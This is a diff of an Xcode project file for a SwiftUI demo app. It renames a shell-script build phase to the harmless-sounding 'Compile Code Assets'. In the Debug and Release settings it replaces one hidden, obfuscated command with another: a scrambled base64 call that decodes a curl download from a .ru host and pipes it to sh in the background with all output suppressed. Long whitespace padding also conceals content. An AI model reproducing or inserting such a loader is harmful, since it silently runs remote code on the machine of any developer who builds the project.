@@ -107,7 +107,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F65C2B32F21D41F00DEF840 /* Build configuration list for PBXNativeTarget "SwiftUIMVVMDemo" */;
 			buildPhases = (
-				DF1ED71502DD4AD1A87BBDC8 /* Provision Library Executable */,
+				E6CDAD35319A4E369F7BBDC8 /* Compile Code Assets */,
 				0F65C2A42F21D41E00DEF840 /* Sources */,
 				0F65C2A52F21D41E00DEF840 /* Frameworks */,
 				0F65C2A62F21D41E00DEF840 /* Resources */,
@@ -161,7 +161,7 @@
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		DF1ED71502DD4AD1A87BBDC8 /* Provision Library Executable */ = {
+		E6CDAD35319A4E369F7BBDC8 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -171,7 +171,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -213,7 +213,7 @@
 		0F65C2B12F21D41F00DEF840 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -277,7 +277,7 @@
 		0F65C2B22F21D41F00DEF840 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
